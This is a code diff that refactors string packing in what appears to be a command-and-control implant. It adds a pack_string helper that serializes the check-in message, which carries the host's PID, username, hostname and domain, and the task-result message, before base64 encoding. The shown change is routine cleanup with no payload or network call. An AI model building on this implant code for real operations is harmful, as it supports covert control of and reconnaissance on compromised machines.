@@ -22,6 +22,20 @@ void pack_uint(char *buf, int *offset, unsigned int paydata) {
 	}
 }
 
+void pack_string(char *buf, int *offset, char *paydata) {
+	if (paydata != 0) {
+		int len = MSVCRT$strlen(paydata);
+		for (int i = 0; i < len; i++) {
+			buf[*offset] = paydata[i];
+			*offset += 1;
+		}
+	}
+	
+	// Add the null byte (even if the string was empty).
+	buf[*offset] = 0;
+	*offset += 1;
+}
+
 /*
  *
  * CHECKIN LOGIC
@@ -49,44 +63,10 @@ char *generate_checkin_message(CheckinRequest *checkin) {
 	// 4 bytes for the PID.
 	pack_uint(msg, &offset, checkin->pid);
 	
-	// Optional user field.
-	if (checkin->username != 0) {
-		int user_len = MSVCRT$strlen(checkin->username);
-		for (int i = 0; i < user_len; i++) {
-			msg[offset] = checkin->username[i];
-			offset++;
-		}
-	}
-	
-	// Add the null byte (if there was no user field, this represents an empty string).
-	msg[offset] = 0;
-	offset++;
-	
-	// Optional hostname field.
-	if (checkin->hostname != 0) {
-		int host_len = MSVCRT$strlen(checkin->hostname);
-		for (int i = 0; i < host_len; i++) {
-			msg[offset] = checkin->hostname[i];
-			offset++;
-		}
-	}
-	
-	// Add the null byte (if there was no host field, this represents an empty string).
-	msg[offset] = 0;
-	offset++;
-	
-	// Optional domain field.
-	if (checkin->domain != 0) {
-		int domain_len = MSVCRT$strlen(checkin->domain);
-		for (int i = 0; i < domain_len; i++) {
-			msg[offset] = checkin->domain[i];
-			offset++;
-		}
-	}
-	
-	// Add the null byte (if there was no domain field, this represents an empty string).
-	msg[offset] = 0;
-	offset++;	
+	// Optional string fields.
+	pack_string(msg, &offset, checkin->username);
+	pack_string(msg, &offset, checkin->hostname);
+	pack_string(msg, &offset, checkin->domain);
 	
 	// Base64-encode the serialized message.
 	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -282,44 +262,10 @@ char *generate_post_message(TaskPostRequest *post) {
 	msg[offset] = MESSAGE_TYPE_POST;
 	offset += 1;
 
-	// Task ID field.
-	if (post->task_id != 0) {
-		int id_len = MSVCRT$strlen(post->task_id);
-		for (int i = 0; i < id_len; i++) {
-			msg[offset] = post->task_id[i];
-			offset++;
-		}
-	}
-	
-	// Add the null byte.
-	msg[offset] = 0;
-	offset++;
-	
-	// Task output field.
-	if (post->task_output != 0) {
-		int out_len = MSVCRT$strlen(post->task_output);
-		for (int i = 0; i < out_len; i++) {
-			msg[offset] = post->task_output[i];
-			offset++;
-		}
-	}
-	
-	// Add the null byte.
-	msg[offset] = 0;
-	offset++;
-	
-	// Task status field.
-	if (post->task_status != 0) {
-		int status_len = MSVCRT$strlen(post->task_status);
-		for (int i = 0; i < status_len; i++) {
-			msg[offset] = post->task_status[i];
-			offset++;
-		}
-	}
-	
-	// Add the null byte.
-	msg[offset] = 0;
-	offset++;
+	// String fields.
+	pack_string(msg, &offset, post->task_id);
+	pack_string(msg, &offset, post->task_output);
+	pack_string(msg, &offset, post->task_status);
 	
 	// Base64-encode the serialized message.
 	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
